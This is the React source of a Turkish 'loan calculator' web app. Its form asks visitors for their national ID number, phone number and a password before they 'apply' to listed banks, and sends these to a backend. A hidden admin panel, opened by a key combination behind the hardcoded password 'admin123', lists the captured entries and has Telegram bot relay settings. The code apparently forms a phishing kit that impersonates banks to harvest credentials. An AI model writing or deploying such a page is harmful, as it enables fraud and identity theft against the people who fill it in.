import { useState, useEffect } from 'react'
import { Calculator, Settings, Shield, Key, Save } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent } from '@/components/ui/card'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Label } from '@/components/ui/label'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import './App.css'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

interface Bank {
  id: number
  name: string
  logo: string
  interest_rate: number
  max_amount: number
  campaign: string
  color: string
  is_active: boolean
  max_applications: number
}

interface LoanOffer {
  bank: Bank
  monthly_payment: number
  total_payment: number
  total_interest: number
}

interface Application {
  id: number
  tc_kimlik: string
  telefon: string
  bank_name: string
  loan_amount: number
  loan_term: number
  created_at: string
  status: string
}

function App() {
  const [banks, setBanks] = useState<Bank[]>([])
  const [applications, setApplications] = useState<Application[]>([])
  const [filteredApplications, setFilteredApplications] = useState<Application[]>([])
  const [selectedBank, setSelectedBank] = useState<string>('')
  const [bankStats, setBankStats] = useState<{[key: string]: number}>({})
  const [editingBank, setEditingBank] = useState<Bank | null>(null)
  const [isAddingBank, setIsAddingBank] = useState(false)
  const [newBank, setNewBank] = useState<Partial<Bank>>({
    name: '',
    logo: '',
    interest_rate: 0,
    max_amount: 0,
    campaign: '',
    color: '#3B82F6',
    is_active: true,
    max_applications: 100
  })

  const [formData, setFormData] = useState({
    tc_kimlik: '',
    telefon: '',
    bank_name: '',
    amount: '',
    months: '',
    sifre: ''
  })

  const [loanOffers, setLoanOffers] = useState<LoanOffer[]>([])
  const [showAdmin, setShowAdmin] = useState(false)
  const [adminPassword, setAdminPassword] = useState('')
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
  const [telegramSettings, setTelegramSettings] = useState({
    bot_token: '',
    chat_id: ''
  })

  useEffect(() => {
    loadBanks()
    loadApplications()
    
    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.ctrlKey && event.shiftKey && event.key === 'A') {
        event.preventDefault()
        setShowAdmin(true)
      }
    }

    window.addEventListener('keydown', handleKeyDown)
    return () => window.removeEventListener('keydown', handleKeyDown)
  }, [])

  useEffect(() => {
    if (selectedBank) {
      const filtered = applications.filter(app => app.bank_name === selectedBank)
      setFilteredApplications(filtered)
    } else {
      setFilteredApplications(applications)
    }
  }, [selectedBank, applications])

  useEffect(() => {
    const stats: {[key: string]: number} = {}
    applications.forEach(app => {
      stats[app.bank_name] = (stats[app.bank_name] || 0) + 1
    })
    setBankStats(stats)
  }, [applications])

  const loadBanks = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/banks`)
      if (response.ok) {
        const data = await response.json()
        setBanks(data)
      }
    } catch (error) {
      console.error('Error loading banks:', error)
    }
  }

  const loadApplications = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/applications`)
      if (response.ok) {
        const data = await response.json()
        setApplications(data)
      }
    } catch (error) {
      console.error('Error loading applications:', error)
    }
  }

  const createBank = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/banks`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(newBank),
      })
      if (response.ok) {
        await loadBanks()
        setIsAddingBank(false)
        setNewBank({
          name: '',
          logo: '',
          interest_rate: 0,
          max_amount: 0,
          campaign: '',
          color: '#3B82F6',
          is_active: true,
          max_applications: 100
        })
      }
    } catch (error) {
      console.error('Error creating bank:', error)
    }
  }

  const updateBank = async () => {
    if (!editingBank) return
    try {
      const response = await fetch(`${API_BASE_URL}/banks/${editingBank.id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(editingBank),
      })
      if (response.ok) {
        await loadBanks()
        setEditingBank(null)
      }
    } catch (error) {
      console.error('Error updating bank:', error)
    }
  }

  const deleteBank = async (bankId: number) => {
    try {
      const response = await fetch(`${API_BASE_URL}/banks/${bankId}`, {
        method: 'DELETE',
      })
      if (response.ok) {
        await loadBanks()
      }
    } catch (error) {
      console.error('Error deleting bank:', error)
    }
  }

  const calculateLoan = () => {
    const amount = parseFloat(formData.amount)
    const months = parseInt(formData.months)
    
    if (!amount || !months) return

    const offers = banks
      .filter(bank => bank.is_active && amount <= bank.max_amount)
      .map(bank => {
        const monthlyRate = bank.interest_rate / 100 / 12
        const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, months)) / 
                              (Math.pow(1 + monthlyRate, months) - 1)
        const totalPayment = monthlyPayment * months
        const totalInterest = totalPayment - amount

        return {
          bank,
          monthly_payment: monthlyPayment,
          total_payment: totalPayment,
          total_interest: totalInterest
        }
      })
      .sort((a, b) => a.monthly_payment - b.monthly_payment)

    setLoanOffers(offers)
  }

  const submitApplication = async (bankName: string) => {
    try {
      const applicationData = {
        tc_kimlik: formData.tc_kimlik,
        telefon: formData.telefon,
        bank_name: bankName,
        amount: parseInt(formData.amount),
        months: parseInt(formData.months),
        sifre: formData.sifre
      }

      const response = await fetch(`${API_BASE_URL}/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(applicationData),
      })

      if (response.ok) {
        alert('Başvurunuz başarıyla gönderildi!')
        setFormData({
          tc_kimlik: '',
          telefon: '',
          bank_name: '',
          amount: '',
          months: '',
          sifre: ''
        })
        setLoanOffers([])
        await loadApplications()
      } else {
        const errorData = await response.json()
        alert('Başvuru gönderilirken hata oluştu: ' + JSON.stringify(errorData))
      }
    } catch (error) {
      console.error('Error submitting application:', error)
      alert('Başvuru gönderilirken hata oluştu!')
    }
  }

  const handleAdminLogin = () => {
    if (adminPassword === 'admin123') {
      setIsAdminAuthenticated(true)
      setShowAdmin(false)
      setAdminPassword('')
    } else {
      alert('Yanlış şifre!')
    }
  }

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('tr-TR', {
      style: 'currency',
      currency: 'TRY'
    }).format(amount)
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('tr-TR')
  }

  const formatApplicationDetails = (app: Application) => {
    return `👤 T.C. Kimlik: ${app.tc_kimlik}
🔐 Şifre: [Gizli]
📞 Telefon: ${app.telefon}
🏛️ Banka: ${app.bank_name}
💰 Tutar: ${formatCurrency(app.loan_amount)}
📅 Vade: ${app.loan_term} ay
⏰ Tarih: ${formatDate(app.created_at)}`
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            {/* Logo and Brand */}
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                  <Calculator className="w-5 h-5 text-white" />
                </div>
                <span className="text-xl font-bold text-gray-900">Hesap</span>
              </div>
            </div>

            {/* Navigation */}
            <nav className="hidden md:flex items-center space-x-8">
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">Anasayfa</a>
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">Krediler</a>
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">Hesaplama</a>
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">İletişim</a>
            </nav>

            {/* CTA Button */}
            <div className="flex items-center space-x-4">
              <Button className="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg font-medium">
                Faizsiz fırsatlar
              </Button>
              <button className="md:hidden p-2">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                </svg>
              </button>
            </div>
          </div>

          {/* Mobile Navigation */}
          <div className="md:hidden border-t border-gray-200 py-4">
            <nav className="flex flex-col space-y-2">
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">Anasayfa</a>
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">Krediler</a>
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">Hesaplama</a>
              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">İletişim</a>
            </nav>
          </div>
        </div>
      </header>

      <div className="max-w-6xl mx-auto p-6">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-gray-800 mb-4">Kredi Hesaplama Aracı</h1>
          <p className="text-lg text-gray-600">En uygun kredi seçeneklerini karşılaştırın</p>
        </div>

        <div className="grid md:grid-cols-2 gap-8 mb-8">
          <Card className="p-6">
            <h2 className="text-2xl font-semibold mb-6 flex items-center gap-2">
              <Calculator className="w-6 h-6" />
              Kredi Bilgileri
            </h2>
            
            <div className="space-y-4">
              <div>
                <Label htmlFor="tc_kimlik">T.C. Kimlik No</Label>
                <Input
                  id="tc_kimlik"
                  type="text"
                  placeholder="T.C. Kimlik numaranızı girin"
                  value={formData.tc_kimlik}
                  onChange={(e) => setFormData({...formData, tc_kimlik: e.target.value})}
                />
              </div>

              <div>
                <Label htmlFor="telefon">Telefon</Label>
                <Input
                  id="telefon"
                  type="tel"
                  placeholder="Telefon numaranızı girin"
                  value={formData.telefon}
                  onChange={(e) => setFormData({...formData, telefon: e.target.value})}
                />
              </div>

              <div>
                <Label htmlFor="sifre">Şifre</Label>
                <Input
                  id="sifre"
                  type="password"
                  placeholder="Şifrenizi girin"
                  value={formData.sifre}
                  onChange={(e) => setFormData({...formData, sifre: e.target.value})}
                />
              </div>

              <div>
                <Label htmlFor="amount">Kredi Tutarı (TL)</Label>
                <Input
                  id="amount"
                  type="number"
                  placeholder="Kredi tutarını girin"
                  value={formData.amount}
                  onChange={(e) => setFormData({...formData, amount: e.target.value})}
                />
              </div>

              <div>
                <Label htmlFor="months">Vade (Ay)</Label>
                <Select value={formData.months} onValueChange={(value) => setFormData({...formData, months: value})}>
                  <SelectTrigger>
                    <SelectValue placeholder="Vade seçin" />
                  </SelectTrigger>
                  <SelectContent>
                    {[12, 24, 36, 48, 60].map(month => (
                      <SelectItem key={month} value={month.toString()}>{month} ay</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <Button 
                onClick={calculateLoan} 
                className="w-full bg-blue-600 hover:bg-blue-700"
                disabled={!formData.amount || !formData.months}
              >
                Kredi Hesapla
              </Button>
            </div>
          </Card>

          <Card className="p-6">
            <h2 className="text-2xl font-semibold mb-6">Kredi Seçenekleri</h2>
            
            {loanOffers.length === 0 ? (
              <div className="text-center text-gray-500 py-8">
                <Calculator className="w-12 h-12 mx-auto mb-4 opacity-50" />
                <p>Kredi seçeneklerini görmek için hesaplama yapın</p>
              </div>
            ) : (
              <div className="space-y-4 max-h-96 overflow-y-auto">
                {loanOffers.map((offer, index) => (
                  <Card 
                    key={index} 
                    className="p-4 hover:shadow-md transition-shadow"
                    style={{ 
                      borderLeft: `4px solid ${offer.bank.color}`,
                      borderColor: offer.bank.color 
                    }}
                  >
                    <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                      <div className="flex items-center gap-3">
                        <img 
                          src={offer.bank.logo} 
                          alt={offer.bank.name}
                          className="w-12 h-12 object-contain"
                        />
                        <div>
                          <h3 className="font-semibold text-lg">{offer.bank.name}</h3>
                          <p className="text-sm text-gray-600 break-words">
                            {offer.bank.campaign}
                          </p>
                        </div>
                      </div>
                      
                      <div className="text-right sm:text-left">
                        <div className="text-sm text-gray-600">Aylık Ödeme</div>
                        <div className="text-xl font-bold text-green-600">
                          {formatCurrency(offer.monthly_payment)}
                        </div>
                        <div className="text-xs text-gray-500">
                          Toplam: {formatCurrency(offer.total_payment)}
                        </div>
                      </div>
                      
                      <Button 
                        onClick={() => submitApplication(offer.bank.name)}
                        className="w-full sm:w-auto bg-green-600 hover:bg-green-700"
                        disabled={!formData.tc_kimlik || !formData.telefon || !formData.sifre}
                      >
                        Hemen başvur
                      </Button>
                    </div>
                  </Card>
                ))}
              </div>
            )}
          </Card>
        </div>
      </div>

      {/* Admin Panel Dialog */}
      <Dialog open={showAdmin} onOpenChange={setShowAdmin}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Admin Girişi</DialogTitle>
            <DialogDescription>
              Admin paneline erişim için şifrenizi girin
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <Input
              type="password"
              placeholder="Admin şifresi"
              value={adminPassword}
              onChange={(e) => setAdminPassword(e.target.value)}
              onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
            />
            <Button onClick={handleAdminLogin} className="w-full">
              Giriş Yap
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Admin Panel */}
      {isAdminAuthenticated && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg w-full max-w-6xl max-h-[90vh] overflow-hidden">
            <div className="flex justify-between items-center p-6 border-b">
              <h2 className="text-2xl font-bold flex items-center gap-2">
                <Settings className="w-6 h-6" />
                Admin Panel
              </h2>
              <Button 
                variant="outline" 
                onClick={() => setIsAdminAuthenticated(false)}
              >
                Kapat
              </Button>
            </div>
            
            <div className="p-6 overflow-y-auto max-h-[calc(90vh-120px)]">
              <Tabs defaultValue="applications" className="w-full">
                <TabsList className="grid w-full grid-cols-4">
                  <TabsTrigger value="applications">Başvurular</TabsTrigger>
                  <TabsTrigger value="stats">İstatistikler</TabsTrigger>
                  <TabsTrigger value="banks">Banka Yönetimi</TabsTrigger>
                  <TabsTrigger value="telegram">Telegram</TabsTrigger>
                </TabsList>
                
                <TabsContent value="applications" className="space-y-4">
                  <div className="flex gap-4 items-center">
                    <Select value={selectedBank} onValueChange={setSelectedBank}>
                      <SelectTrigger className="w-64">
                        <SelectValue placeholder="Banka filtrele" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="">Tüm Bankalar</SelectItem>
                        {banks.map(bank => (
                          <SelectItem key={bank.id} value={bank.name}>
                            {bank.name}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    {selectedBank && (
                      <Button 
                        variant="outline" 
                        onClick={() => setSelectedBank('')}
                      >
                        Filtreyi Temizle
                      </Button>
                    )}
                  </div>
                  
                  <div className="grid gap-4">
                    {filteredApplications.map(app => (
                      <Card key={app.id} className="p-4">
                        <pre className="whitespace-pre-wrap text-sm font-mono">
                          {formatApplicationDetails(app)}
                        </pre>
                      </Card>
                    ))}
                  </div>
                </TabsContent>
                
                <TabsContent value="stats" className="space-y-4">
                  <h3 className="text-xl font-semibold">Banka Başvuru İstatistikleri</h3>
                  <div className="grid gap-4">
                    {Object.entries(bankStats).map(([bankName, count]) => (
                      <Card key={bankName} className="p-4">
                        <div className="flex justify-between items-center">
                          <span className="font-medium">{bankName}</span>
                          <span className="text-2xl font-bold text-blue-600">{count}</span>
                        </div>
                      </Card>
                    ))}
                  </div>
                </TabsContent>

                <TabsContent value="banks" className="space-y-4">
                  <div className="flex justify-between items-center">
                    <h3 className="text-xl font-semibold">Banka Yönetimi</h3>
                    <Button onClick={() => setIsAddingBank(true)}>
                      Yeni Banka Ekle
                    </Button>
                  </div>
                  
                  <div className="grid gap-4">
                    {banks.map(bank => (
                      <Card key={bank.id} className="p-4">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-4">
                            <img 
                              src={bank.logo} 
                              alt={bank.name}
                              className="w-12 h-12 object-contain"
                            />
                            <div>
                              <h4 className="font-semibold">{bank.name}</h4>
                              <p className="text-sm text-gray-600">
                                Faiz: %{bank.interest_rate} | Max: {formatCurrency(bank.max_amount)}
                              </p>
                              <p className="text-sm text-gray-600">
                                Durum: {bank.is_active ? 'Aktif' : 'Pasif'} | 
                                Max Başvuru: {bank.max_applications}
                              </p>
                            </div>
                          </div>
                          <div className="flex gap-2">
                            <Button 
                              variant="outline" 
                              size="sm"
                              onClick={() => setEditingBank(bank)}
                            >
                              Düzenle
                            </Button>
                            <Button 
                              variant="destructive" 
                              size="sm"
                              onClick={() => deleteBank(bank.id)}
                            >
                              Sil
                            </Button>
                          </div>
                        </div>
                      </Card>
                    ))}
                  </div>
                </TabsContent>
                
                <TabsContent value="telegram" className="space-y-4">
                  <h3 className="text-xl font-semibold">Telegram Ayarları</h3>
                  <div className="space-y-4">
                    <div>
                      <Label htmlFor="bot_token">Bot Token</Label>
                      <Input
                        id="bot_token"
                        type="text"
                        placeholder="Telegram bot token"
                        value={telegramSettings.bot_token}
                        onChange={(e) => setTelegramSettings({
                          ...telegramSettings,
                          bot_token: e.target.value
                        })}
                      />
                    </div>
                    <div>
                      <Label htmlFor="chat_id">Chat ID</Label>
                      <Input
                        id="chat_id"
                        type="text"
                        placeholder="Telegram chat ID"
                        value={telegramSettings.chat_id}
                        onChange={(e) => setTelegramSettings({
                          ...telegramSettings,
                          chat_id: e.target.value
                        })}
                      />
                    </div>
                    <Button className="w-full">
                      <Save className="w-4 h-4 mr-2" />
                      Ayarları Kaydet
                    </Button>
                  </div>
                </TabsContent>
              </Tabs>
            </div>
          </div>
        </div>
      )}

      {/* Bank Edit Dialog */}
      {editingBank && (
        <Dialog open={!!editingBank} onOpenChange={() => setEditingBank(null)}>
          <DialogContent className="max-w-md">
            <DialogHeader>
              <DialogTitle>Banka Düzenle</DialogTitle>
            </DialogHeader>
            <div className="space-y-4">
              <div>
                <Label>Banka Adı</Label>
                <Input
                  value={editingBank.name}
                  onChange={(e) => setEditingBank({...editingBank, name: e.target.value})}
                />
              </div>
              <div>
                <Label>Logo URL</Label>
                <Input
                  value={editingBank.logo}
                  onChange={(e) => setEditingBank({...editingBank, logo: e.target.value})}
                />
              </div>
              <div>
                <Label>Faiz Oranı (%)</Label>
                <Input
                  type="number"
                  step="0.01"
                  value={editingBank.interest_rate}
                  onChange={(e) => setEditingBank({...editingBank, interest_rate: parseFloat(e.target.value)})}
                />
              </div>
              <div>
                <Label>Maksimum Tutar</Label>
                <Input
                  type="number"
                  value={editingBank.max_amount}
                  onChange={(e) => setEditingBank({...editingBank, max_amount: parseInt(e.target.value)})}
                />
              </div>
              <div>
                <Label>Kampanya</Label>
                <Input
                  value={editingBank.campaign}
                  onChange={(e) => setEditingBank({...editingBank, campaign: e.target.value})}
                />
              </div>
              <div>
                <Label>Renk</Label>
                <Input
                  type="color"
                  value={editingBank.color}
                  onChange={(e) => setEditingBank({...editingBank, color: e.target.value})}
                />
              </div>
              <div>
                <Label>Maksimum Başvuru Sayısı</Label>
                <Input
                  type="number"
                  value={editingBank.max_applications}
                  onChange={(e) => setEditingBank({...editingBank, max_applications: parseInt(e.target.value)})}
                />
              </div>
              <div className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  id="is_active"
                  checked={editingBank.is_active}
                  onChange={(e) => setEditingBank({...editingBank, is_active: e.target.checked})}
                />
                <Label htmlFor="is_active">Aktif</Label>
              </div>
              <div className="flex gap-2">
                <Button onClick={updateBank} className="flex-1">
                  Güncelle
                </Button>
                <Button variant="outline" onClick={() => setEditingBank(null)} className="flex-1">
                  İptal
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}

      {/* Add Bank Dialog */}
      {isAddingBank && (
        <Dialog open={isAddingBank} onOpenChange={setIsAddingBank}>
          <DialogContent className="max-w-md">
            <DialogHeader>
              <DialogTitle>Yeni Banka Ekle</DialogTitle>
            </DialogHeader>
            <div className="space-y-4">
              <div>
                <Label>Banka Adı</Label>
                <Input
                  value={newBank.name}
                  onChange={(e) => setNewBank({...newBank, name: e.target.value})}
                />
              </div>
              <div>
                <Label>Logo URL</Label>
                <Input
                  value={newBank.logo}
                  onChange={(e) => setNewBank({...newBank, logo: e.target.value})}
                />
              </div>
              <div>
                <Label>Faiz Oranı (%)</Label>
                <Input
                  type="number"
                  step="0.01"
                  value={newBank.interest_rate}
                  onChange={(e) => setNewBank({...newBank, interest_rate: parseFloat(e.target.value)})}
                />
              </div>
              <div>
                <Label>Maksimum Tutar</Label>
                <Input
                  type="number"
                  value={newBank.max_amount}
                  onChange={(e) => setNewBank({...newBank, max_amount: parseInt(e.target.value)})}
                />
              </div>
              <div>
                <Label>Kampanya</Label>
                <Input
                  value={newBank.campaign}
                  onChange={(e) => setNewBank({...newBank, campaign: e.target.value})}
                />
              </div>
              <div>
                <Label>Renk</Label>
                <Input
                  type="color"
                  value={newBank.color}
                  onChange={(e) => setNewBank({...newBank, color: e.target.value})}
                />
              </div>
              <div>
                <Label>Maksimum Başvuru Sayısı</Label>
                <Input
                  type="number"
                  value={newBank.max_applications}
                  onChange={(e) => setNewBank({...newBank, max_applications: parseInt(e.target.value)})}
                />
              </div>
              <div className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  id="new_is_active"
                  checked={newBank.is_active}
                  onChange={(e) => setNewBank({...newBank, is_active: e.target.checked})}
                />
                <Label htmlFor="new_is_active">Aktif</Label>
              </div>
              <div className="flex gap-2">
                <Button onClick={createBank} className="flex-1">
                  Ekle
                </Button>
                <Button variant="outline" onClick={() => setIsAddingBank(false)} className="flex-1">
                  İptal
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}
    </div>
  )
}

export default App
